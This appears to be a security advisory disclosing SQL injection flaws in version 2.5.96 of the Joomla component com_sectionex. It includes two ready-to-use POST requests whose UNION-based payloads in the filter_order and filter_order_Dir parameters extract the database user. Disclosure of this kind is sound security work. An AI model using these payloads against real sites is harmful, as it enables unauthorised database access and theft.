Joomla com_sectionex v2.5.96 SQL Injection vulnerabilities
-------------------------------------------------------------------------------------

== Description ==
- Software link: http://stackideas.com/sectionex
- Affected versions: version 2.5.96 is vulnerable. Other versions
might be affected as well.
- Author: Matias Fontanini

== Vulnerabilities ==
When using the "category" view, the component does not correctly
sanitize the "filter_order" and "filter_order_Dir" parameters before
using them to construct SQL queries, making it vulnerable to SQL
Injection attacks.

In order to exploit these vulnerabilities, an attacker could perform
requests like the following ones:

- For the "filter_order" parameter:

POST /index.php?option=com_sectionex&view=category&id=X&Itemid=Y

filter_title=&filter_content=&limit=0&sectionid=20&filter_order=1
limit 1 offset 10000) union all (select
1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16 from
dual)%23&filter_order_Dir=DESC

- For the "filter_order_Dir" parameter:

POST /index.php?option=com_sectionex&view=category&id=X&Itemid=Y

filter_title=&filter_content=&limit=0&sectionid=20&filter_order=1&filter_order_Dir=DESC
limit 1 offset 10000) union all (select
1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16 from dual)%23
